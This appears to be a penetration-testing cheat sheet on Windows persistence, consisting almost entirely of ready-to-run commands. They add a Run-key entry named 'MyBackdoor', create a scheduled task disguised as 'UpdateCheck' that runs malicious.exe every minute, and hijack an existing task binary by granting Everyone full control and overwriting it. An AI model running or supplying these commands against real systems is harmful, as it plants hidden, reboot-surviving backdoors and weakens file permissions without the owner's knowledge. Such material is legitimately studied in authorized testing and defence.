# Windows Persistence

!!! tip "Tip"
    Registry Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) persist across reboots and are user-writable without admin. For admin persistence, scheduled tasks with SYSTEM privileges are more reliable than services.

---

## Registry-Based Persistence

### Enumerate Auto-Run Keys

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Create a Registry Key for Persistence

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

---

## Scheduled Task Persistence

### List All Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

### Create a Malicious Scheduled Task

```powershell
schtasks /create /sc minute /mo 1 /tn "UpdateCheck" /tr "C:\Users\Public\malicious.exe" /F
```

### Hijack an Existing Task Binary

```powershell
icacls C:\Path\To\TaskBinary.exe /grant Everyone:F
copy malicious.exe C:\Path\To\TaskBinary.exe
```

### Trigger Task Immediately

```powershell
schtasks /run /tn "UpdateCheck"
```
